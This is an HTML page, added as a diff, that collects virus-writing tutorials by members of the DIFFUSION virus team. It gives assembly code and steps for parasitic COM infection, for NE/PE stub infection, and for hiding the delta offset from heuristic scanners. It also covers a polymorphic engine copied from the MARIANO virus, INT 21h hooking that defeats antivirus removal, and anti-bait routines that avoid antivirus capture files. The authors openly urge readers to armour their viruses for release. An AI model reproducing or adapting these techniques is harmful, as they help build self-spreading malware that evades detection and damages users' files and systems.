@@ -1,0 +1,565 @@
+<html>
+
+<head>
+
+<title>Tutorials - Jerk1N's Tutorial Series</title>
+</head>
+
+<body background="tuback01.gif" bgcolor="#C0C0C0" text="#000000"
+link="#800000" vlink="#800000" alink="#800000">
+
+<p align="center"><font color="#004080" size="6"><b>The Jerk1N's
+Tutorial Series</b></font> </p>
+
+<hr>
+
+<blockquote>
+    <blockquote>
+        <blockquote>
+            <ol>
+                <li><a href="#jrk01">Parasitic COM Infection</a></li>
+                <li><a href="#jrk02">Memory Addressing</a></li>
+                <li><a href="#jrk03">Anti-Removal</a></li>
+                <li><a href="#jrk04">Anti-Bait</a></li>
+                <li><a href="#jrk05">NE EXE Infection</a></li>
+            </ol>
+        </blockquote>
+    </blockquote>
+</blockquote>
+
+<blockquote> 
+  <pre><font size="4"><b><a name="jrk01"></a>Jerk1N's Tutorial On Parasitic COM Infection
+============================================
+
+</b></font>I won't blast out all assembly stuff in your face, I assume you can at least
+write an overwritting virus in assembly.
+
+<b>INDEX
+~~~~~
+</b>1) What To Save
+2) Jumping to the Virus
+3) Extra Trix
+
+
+<b>1. What To Save
+~~~~~~~~~~~~~~~
+</b> Okay, in a standard COM infection, the first 3 bytes must be saved, so
+read them and place them in a empty area (WITHIN THE VIRUS! NOT IN THE
+HEAP!), as a default you should have 3 bytes -
+
+orig3   db      0CDh,20h,00h
+
+These 3 MUST be restored before reading the new 3 bytes, this is done by -
+        mov     di,100h
+        lea     si,[bp+offset orig3]    ;Assuming BP contains delta offset
+        movsw
+        movsb
+
+Why 3? Well a jump statement in ASM compiled is a 1 byte statement with
+a 2 byte address, so 3 bytes to jump to your virus is needed.
+
+
+<b>2. Jumping to the Virus
+~~~~~~~~~~~~~~~~~~~~~~~
+</b> The best whay to make sure your jump is 3 bytes long is to type it in
+in DB statements -
+
+start:
+        db      0E9h,00h,00h
+
+So these 3 bytes overwrite the bytes you have saved. BEFORE you write them,
+this is one thing I forgot about in Lone.Vengance at first, you must LSEEK
+to the END of the file to get the address of where you are jumping to and
+replace the two 00h bytes with the new address. Just remember to LSEEK back
+to the beginning before you write the 3 bytes, else you'll be writting them
+to the end of the file, and that's NOT what we want. After this LSEEK to the
+end of the file and write the virus.
+
+<b>3. Extra Trix
+~~~~~~~~~~~~~
+</b> If you look at my Lone.Vengance virus, I save 6 bytes instead of 3! The
+reason is that I have 05h,00h,00h so I could use these for checking if I
+had already infected the selected file.
+
+If you have any comments, questions etc. just EMail me at
+jerk1n@trust-me.com
+
+DIFFUSION's website - http://uk.zarcrom.com/freehome/jerk1n</pre>
+  <pre><font size="4"><b><a name="jrk02"></a>Jerk1N's Tutorial On Memory Addressing
+======================================
+
+</b></font>The first thing to do in a virus (and any other program which might need it!)
+is to get the DELTA OFFSET, this internally shows us the location in memory
+and will be the basis for accessing parts of the virus. To get the Delta
+Offset we must use some code like this -
+
+        call    $+3
+        pop     bp
+        sub     bp,offset $-1
+
+OR
+
+        call    getdo
+getdo:  pop     bp
+        sub     bp,offset getdo
+
+Unfortunatly ThunderByte has stuck this in their heuristic scanner so a flag
+is set if this is found. Of course us virii programers work around everything
+so the code would be like this -
+
+        call    $+3
+        pop     si
+        sub     si,offset $-1
+        xchg    si,bp
+
+OR
+        call    $+3
+c:      pop     si
+        xchg    si,bp
+        sub     bp,offset c
+
+OR
+        call    c
+c:      pop     si
+        xchg    si,bp
+        sub     bp,offset c
+
+BTW - You don't have to use SI as the tempory register, it's just one I
+picked for this example.
+
+Once this is done, any section of your virus can be accessed from anywhere.
+The step to do this is simple -
+
+Instead of -
+        lea     dx,[offset filespec]
+use -
+        lea     dx,[bp+offset filespec]
+
+NOTE - You MUST include the square brackets!!!!
+
+<b>A good Question
+~~~~~~~~~~~~~~~
+</b>Q.
+~~
+When do I use LEA and when do I use MOV?
+
+A.
+~~
+When accessing a sub-routine or interrupt call which requires a POINTER
+eg.
+
+INT 21 - DOS 2+ - FIND FIRST ASCIZ (FIND FIRST)
+        DX = pointer to ASCIZ filename
+
+then you will require a LEA as you will want to Load an Exact Address. I
+don't think LEA stands for that but it's the easiest way to remember it.
+ However, If you want the VALUE STORED at an address then use MOV to put
+the value AT the given address INTO the selected variable.
+eg.
+100h
+100h         jmp     tk
+103h joke    db      05h,05h
+105h tk:
+107h         lea     dx,[bp+offset joke]     ;DX = 0103h (ADDRESS Of joke)
+10Ah         mov     dx,[bp+offset joke]     ;DX = 0505h (Word @ Joke offset)
+
+Need any more help? Just Mail me
+        Jerk1N, of DIFFUSION Virus Team
+                &lt;jerk1n@trust-me.com&gt;
+
+&quot;Life is anything which dies when you stomp on it!&quot; - Jerk1N
+http://uk.zarcrom.com/freehome/jerk1n - DIFFUSION HomePage</pre>
+  <pre><font size="4"><b><a name="jrk03"></a>Jerk1N's Tutorial On Anti-Removal
+=================================
+</b></font>Well, I'm back again.... Your probably getting bored stiff with the shit
+that I write in here! BUT hold on, this one might actually do some good!
+Now then, where was I? Oh yes, Anti-Removal... Okay, if a virus is to
+survive it needs to eliminate all ways of eliminating it so.......
+
+<b>Trick 1: Polymorphism
+=====================
+</b>Well, this doesn't work to great now-a-days, now AV have started developing
+software which undoes the engine BUT doesn't execute the virus! If you make
+your own engine, then you might get a bit further, but not much.
+Polymorphism was designed so viruses couldn't be string scanned, this also
+helped to take out removal because it'd be different every time. I don't
+like polymorphism to be honest, which is what lead me to my JVS....
+
+Example of a polmorphic engine, taken from the MARIANO virus by Super/29A
+This is probably the smallest engine!
+
+  ;------------&gt; here starts poly engine &lt;------------;
+                                                      ;
+      call get_delta                                  ;
+  get_delta:                                          ;
+      pop si                                          ;
+      sub si,(offset get_delta-offset vir_start)      ;
+      mov di,dx                                       ;
+      mov bp,10bh                                     ;
+      call garbage                                    ;
+      and cl,ah                                       ;
+      mov al,0beh                                     ;
+      xor al,cl                                       ;
+      stosb                                           ;
+      in ax,40h                                       ;
+      stosw                                           ;
+      sub bp,ax                                       ;
+      call garbage                                    ;
+      mov ax,0b480h                                   ;
+      xor ah,cl                                       ;
+      stosw                                           ;
+      xchg bp,ax                                      ;
+      stosw                                           ;
+      mov eax,0f8794600h                              ;
+      or ah,cl                                        ;
+      in al,40h                                       ;
+      stosd                                           ;
+      mov cx,vir_length                               ;
+  decrypt:                                            ;
+      movs byte ptr es:[di],cs:[si]                   ;
+      xor byte ptr [di-1],al                          ;
+      loop decrypt                                    ;
+                                                      ;
+  ;-------------&gt; here ends poly engine &lt;-------------;
+
+  garbage proc
+      inc bp
+      inc bp
+      in ax,40h
+      and al,111b
+      or al,0b0h
+      stosw
+      jp garbage
+      ret
+  garbage endp
+
+
+
+<b>Trick 2: JVS/Virus Scrambling
+=============================
+</b>Rock and roll! I had invented a new way to hide viruses! However, v1 and
+v1.3 were very limited and had 2 states, scrambled and de-scrambled. v2 will
+be random, it'll take bytes from random address' and switch them around.
+This will provide a remarkable hiding and anti-removal tool. JVS v2 will be
+release as soon as I can find the bug which screws it up!
+
+<b>Trick 3: Embedding
+==================
+</b>This *MIGHT* work, if so it'd rule! Okay, how it works is this. The virus
+opens up the file, shifts up the file from the middle, and adds itself to the
+middle of the file then lowering the code down for execution (if COM). I
+have a feeling it wouldn't work with EXE's but maybe with COM's! This will
+also avoid most AV software, because from what I can gather, AV scan
+beginning and end of the files ONLY!!
+
+<b>Trick 4: TSR Middle Finger Salute
+=================================
+</b>I like that name! )8-D.... Okay, this is a trick I've designed ages ago, I
+never use it 'cos I don't make ressy viruses! Don't know why not, I just
+don't. To really KICK ASS, use tunneling to gain the original INT 21h vector,
+hook it, now when checking for OPEN FILE and EXECUTE (and others you watch)
+also check for the RE-VECTOR, if an AV tries to remove your code by switching
+the direction of the INT 21h call then tell your virus to call INT 24h!
+Watch the AV get screwed up as it cannot clean up.....
+
+<b>Conclusion
+==========
+</b>If I can remember any more, I might make AR2.TXT! That poly engine is kewl...
+Well done Super!
+
+<b>Greetz
+======
+</b>Cenobyte        Have you started World War ]I[? |8-D
+Cicatrix        Brill Site Man! Keep it rolling! (Also keep VDAT up-to-date!)
+Crack's Whore   Are you just gonna sit there?
+Dark Mage       How about you?
+Foxz            Hey, wanna put this in your news letter?
+HamDan Wong     Are we gonna see virus production?
+Lot M           Where's this TSR? Still working on it?
+mach 1          Hey, can you give me some of your 25 grand? ;)
+Mike Lopez      Have you got anything on your site yet?
+Nuclii          Where's that bloody interview?
+Patrick Mullen  Thanx for the support, I'm in mixed state at the minute!
+Slage Hammer    Huh, what can I say? G'day! Thanx for all the stuff!
+Smuilt          GodSquad lacked, learn ASM and produce more!! ;)
+Synthesia       Hello? Are you in DIFFUSION?
+VicodinES       Anxiety.Poppy.IV SE rulez man!!! Thanx for AccessiV info!
+Virus           You are fucking crazy! I suggest you cool down!
+
+        Cool down,
+                Jerk1N</pre>
+  <pre><font size="4"><b><a name="jrk04"></a>Ice Breaker's Tutorial On Anti-Bait Coding
+==========================================
+</b></font> Well, I'm back! (Jerk1N?) I'm here again to advance your knowledge in virus
+production, giving your viruses the edge in &quot;The Wild&quot;! So do you know what
+a bait file is? Yes, well skip this bit! No? Okay, A bait file are files
+created especially to capture/isolate your viruses so a scan string can be
+created for it. It also allows AV ppl (I'm not as aggresive to them anymore,
+as they help spread my name!) to get your superior coding (Hey, d'ya want
+some support?).
+ I am *VERY* supprised over the number of viruses which incorperate this
+tricks, they are often small so I think they are invaluable. The only reason
+my Straight Life is the first to include Anti-Bait is because I didn't really
+need it. Most only had a simple encryption algorythm, S. Life contains 3
+encryptors working in different ways! (None are polymorphic though)
+
+<b>SECTION 1: DTA Closed File Methods
+==================================
+ Trick 1: File Size Checking
+ ---------------------------
+</b> Very small files don't appear on a system for a reason! So assume that they
+are bait. Simple bait files are usually up to 10 bytes long for a COM. I've
+NEVER seen a bait file for DOS EXE's, PE EXE's, or NE EXE's... That's 'cos
+all MY attempts failed! But now there are problems, Files are being &quot;Padded&quot;
+to increase the size but are coded so they still exit without doing anything.
+I recommend you DON'T infect COM's under 1kb and EXE's under 4kb, however you
+must vary these amounts according to the amount of armour on your virus. The
+problem is, if you set the values too high, you'll lose valuable files to
+infect when it's not being &quot;Baited&quot;.... Be Carefull!
+
+FSC:
+;Set your DTA to the virus!
+;Get your file into the DTA
+;I assume BP is Delta Offset and DTA is the DTA's Label!
+
+;If it's EXE use this -
+        cmp     byte ptr [bp+offset DTA+1Bh],10h        ;4Kb
+        jle     Find_Next               ;Find next file!
+        jmp     Infect                  ;It's clear to infect!
+
+;If it's a COM use this -
+        cmp     byte ptr [bp+offset DTA+1Bh],4h        ;1Kb, I think!
+        jle     Find_Next               ;Find next file!
+        jmp     Infect                  ;It's clear to infect!
+
+ <b>Trick 2: Standard Bait Filenames
+ --------------------------------
+</b> Well, How many EXE's or COM's do you have on your harddisk labeled
+'00000000.COM', '00000001.COM'... hey? None, except for those generators
+which come with some polymorphic engines. I think it's stupid to provide
+generators, It's okay to show somebody the differences in the products BUT it
+also gives the AV ppl the ability to generate THOUSANDS of copies of the
+engine and working out an algorythm which will pin-point that exact engine!
+ Any of these files in 1 directory gets suspicious! So avoiding them is a must
+check my sample taken from my Straight Life virus, I knew it'd come in handy
+for something!
+
+-----SNIP------
+isbait:
+        xor     ax,ax
+        lea     bx,[bp+offset dta+1Fh]
+        xor     dx,dx
+        mov     cx,07h
+
+isl:    inc     dx
+        cmp     byte ptr [bx],byte ptr [bx-1h]          ;Is it a consistant character?
+        jne     safe
+        cmp     byte ptr [bx],' '
+        je      tb
+        cmp     byte ptr [bx],'.'
+        je      tb
+
+        inc     ax              ;Same as previous, Increase Flag
+
+safe:   inc     bx
+        loop    isl
+tb:
+        mov     cx,08h
+        sub     cx,dx                   ;CX Holds name length
+        dec     cx                      ;Check last character for different
+        cmp     ax,cx
+        jge     getnext                 ;Is *Probably* Bait, so avoid!
+
+;Go on to check File Size! Another Anti-Bait tactic!
+-----SNIP------
+
+<b>SECTION 2: Open File Methods
+============================
+ Trick 1: Exit Now!
+ ------------------
+</b> The easiest way to check for a bait file... Works best with COM's, I've not yet tried it
+with EXE's. When reading in the first few bytes of the file during COM infection check for
+CDh 20h or check for the INT 21h Exit calls (There are a couple, AH=4Ch, AH=00h).. anyway
+if these are found at the beginning of the file, somehow I seem to think these are bait
+files. Don't you? Yes? Good, at least we're getting somewhere! :)
+ For EXE's it'll be slightly different, you'll have to find the code's starting offset,
+LSEEK there (move the file pointer), read in about 5 bytes and check for these exit
+routines.... Guarantueed to fin 100% of bait files using a quick Exit To Dos! If any of 
+you creates a rountine to find EXE bait files using this method, please can you send me a
+sample, my address is at the bottom.
+
+ <b>Trick 2: Do-Nothing till the day you Die
+ ----------------------------------------
+</b> Very simple this, read in about 10 bytes of the code section, COM is at the beginning of
+the file, EXE code will have to be calculated from details in the header. Check all ten
+bytes for code which contains Do-Nothing code, eg. is a load of NOPs (90h) or are push-pop
+(eg. Push Ax, Pop Ax)... These are used so the program can hit the Exit code near the end
+of the coding without crashing the computer and bombing the program out etc. These are also
+Junk Code statements used by poly. engines so BE CAREFULL!
+ To check all these Do-Nothing Op-Codes, I suggest you implement a Polymorhic Engine's Junk
+Code Generator and use it to get Junk code to compare with in the file!
+
+<b>Conclusion
+==========
+</b> Well, I'm exhausted... Think what you will of these tricks, and I'd love to see more anti-
+bait coding in viruses, they just seem to be getting Lamer and Lamer! Where have all the
+&quot;veteran&quot; coders gone? I suggest that you ppl producing over-writer's all the time LEARN!
+Those who are moving on to Parasitic stuff, keep going! Those who have started on the hard
+stuff, PE EXE's, Win95/NT/98 compatability, Start armouring your viruses!
+ There is a complete lack of armouring in viruses now-a-days.. Also, the simple stealth is
+being missed out, changing file dates back is one MAJOR example... Oh that reminds me, I
+gotta put that into Straight Life...
+ Well, you got more of my knowledge, I hope it was worth it! USE THIS CODE, OR SOME WHICH
+DO THE SAME!! ARMOUR YOUR VIRUSES ELSE THEY WILL DIE BEFORE THEY LEAVE YOUR HOUSE!!!!!
+
+ Good night ppl! Come again for my next tutorial, which is on ???? ;) Keep an eye out!
+
+<b>Greetz
+======
+</b>Cenobyte        Are you sure 10 days is good enough?
+Cicatrix        Hey, where's the DIFFUSION collection? :)
+Crack's Whore   Why don't you just finish off that last bit of coding?
+Dark Mage       Alpha stages? Are we gonna see a complete product?
+Foxz            You are one serious arse-hole! ;)
+HamDan Wong     C'mon man, get your ass moving....
+Lot M           Nice knowing ya, Goodbye my friend.. BYE!
+Jerk1N          Am I you? ;) What a give-a-way!
+mach 1          Have you been caught? You fool!
+Mike Lopez      Where have you gone?
+RAiD            Host control was SOOOOO simple! ;)
+Slage Hammer    D'ya recieve my snail-mail yet? ;)
+Smuilt          Deep Thought is kewl, and Cicatrix has got it! heheh
+Synthesia       Sorry to here ya go my friend.... BYE!
+VicodinES       Are you still creating those little fellows?
+Virtual Deamon  Hey, Love SLAM #4!!!!!!!!
+Virus           Your CRAZY!
+
+        Cool down,
+                1ce Breaker     <a
+href="mailto:kma@thevortex.com">kma@thevortex.com</a></pre>
+  <pre><font size="4"><b><a name="jrk05"></a>Ice Breaker's Tutorial On NE EXE Infection
+==========================================
+</b></font> I have found problems within the virus community. Althought NE EXE's are
+dying off and PE's are taking over, I still think that NE infection should
+be known.. Unfortunately, I don't understand it yet, so as I write this,
+I'll be testing it out. I hope this will help you, as it will me. The code
+will be tested, but possibly buggy, Sorry but I can't do any better. The
+presented code will be new and unique as I have coded from scratch! So pls
+bare with me and my coding.
+ For you to take notice in this, I recommend you learn these first!
+ 1. Overwritter
+ 2. Parasitic COM
+ 3. Parasitic DOS EXE  (Actually, Not Required)
+ If you haven't done these, go away until you have!
+
+This is not the best way to do it, but hey, it's new and unique! (And for
+you beginners, VERY simple!)...
+
+<font size="3"><b>The Concept
+===========
+</b></font>Infect the STUB (If you don't know what this is, please leave this, learn,
+then return!) with your virus (Make sure you have enough space, or make
+more for it). Next comes the idea of infection, Re-launch is the key-word!
+
+<font size="3"><b>Stepz of Infection
+==================
+</b></font>After you've found the EXE, and saved it's name..
+1. Open File
+
+2. Read the entire header from offset 00h to 3Fh. Contains IMPORTANT
+   information.
+
+3. Check Offset 18h = 40h (@)
+
+4. Read in the Word at 3Ch. This tells you where the NE/PE header is,
+   This is VERY Important!
+
+5. Get the IP address from Word Offset 8h, the IP is the only thing
+   we need though, this tells us where the code starts for the &quot;This
+   program requires ....&quot; message. This requires slight alteration -
+   40h Start is shown as 04h, 200h Start is shown as 20h.
+
+   Simple command is load word offset 8h into ax (or any reg you want)
+   and have on the next line -
+   rol  ax,04h
+
+   I know in the MZ DOS header the CS:IP was at 14h, but view as many
+   PE's and NE's as you want, you'll notice mine works!
+
+6. Now, Subtract the NE/PE Header start from the IP, This gives you the
+   size of the available space to the virus.
+
+7. Compare the virus size to the available space, if the space is too small
+   you can either, leave the file, or attempt a patching (Move the file from
+   the NE/PE header down, just enough to fit the virus in.. Remember to patch
+   the header for the new NE/PE Header offset!). I don't recommend patching,
+   it will require alot of disk access, probably giving away the virus!
+
+8. Seek from the start to the NE/PE header and check it's a NE Header...
+   If it is not, abort! (Remember, this works with PE EXE's as well!)
+
+9. Seek from the start of the file to the beginning of the STUB
+
+10. Write the virus! The Fun part! Hehehe
+
+11. Seek to the NE Header.
+
+12. Now for the new part, Eliminate the NE Text, use it to create a
+    &quot;Infected&quot; Marker.
+
+13. Close the file
+
+<font size="3"><b>Restoring the Host
+==================
+</b></font> This is easy! Now, if you've been good, and remembered to save the name, The
+virus should have the current EXE's name in it. All you do now, is COPY the
+Host to a Unused name, such as L437GHF4.EXE, Open it, Seek to the Start of the
+NE Header (Save this address as well!) and Overwrite your marker with &quot;NE&quot; to
+restore it's WINDOZE code, then close the file and call an execution routine!
+ SIMPLE!!!!
+
+<font size="3"><b>Conclusion
+==========
+</b></font> A far and winding road, but hey, from my testing it works! I'm sure you can
+go in and play with the NE Header, but I couldn't be arsed really! Also, I
+think that this method is kewl as, providing you don't patch the file, the
+size doesn't increase, and is more reliable than the viruses which search for
+chains of constants, because ALL Win files has the STUB, but they don't all
+have chains of constants! 100% Original Idea, 0% given code, for 3 reasons
+1. It's too simple to need to provide samples
+2. A version of this code will be in the Straight Life virus
+3. I'm too lazy to write it in this tutorial! HAHAHAHAHAHA
+
+
+<font size="3"><b>Last Minute Notes
+=================
+</b></font> I just tried this idea with a PE file, and it works!!!!!!!!!!!!!!!!
+
+<font size="3"><b>Greetz
+======
+</b></font>Cenobyte        Hey man, the work'll cool off soon! Stick with us!
+Cicatrix        Wanna do your own interview with me?
+Crack's Whore   Compile that fucking virus!
+Dark Mage       Why don't you tell me your problem, so I can help!
+Foxz            I **HATE** your site! ;)
+HamDan Wong     Where are you, my friend?
+Jerk1N          ???? ;)
+Mike Lopez      Why aren't you responding to my letters?
+Opic            Kewl viruses my friend, talk soon?
+RAiD            What did ya think of Hellphoria?
+Rajaat          If you read this, please mail me....
+SerialKiller    Why don't my ICQ messages go through to you?
+Slage Hammer    You need England on my address to reach me... :)
+Smuilt          Where's the re-write of your database?
+SPo0ky          Found the SDK's and DDK's yet? ;)
+VicodinES       Where are you? Not seen you for ages..
+Virtual Deamon  Slam #5?
+Virus           How's AccessiV.C doing on the BBS? ;)
+
+        Cool down to the ice level,
+                ][ce Breaker     kma@thevortex.com</pre>
+</blockquote>
+
+<hr>
+</body>
+</html>
